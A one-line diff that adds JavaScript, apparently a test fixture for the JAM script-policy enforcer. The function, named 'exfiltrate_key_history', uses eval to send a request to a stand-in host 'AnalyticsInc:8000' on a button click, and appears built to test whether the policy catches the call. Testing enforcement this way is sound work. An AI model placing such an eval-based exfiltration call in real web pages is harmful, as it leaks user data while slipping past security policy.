@@ -1,0 +1,1 @@
+function exfiltrate_key_history(){var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval2", true);xmlhttp.send(null);',v2="eval",v2=JAM.isEval(eval)?eval("introspect(JAM.policy.pFull) { "+v2+" }"):JAM.call(eval,null,[v2]);JAM.call(v2,null,[exp])}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history)
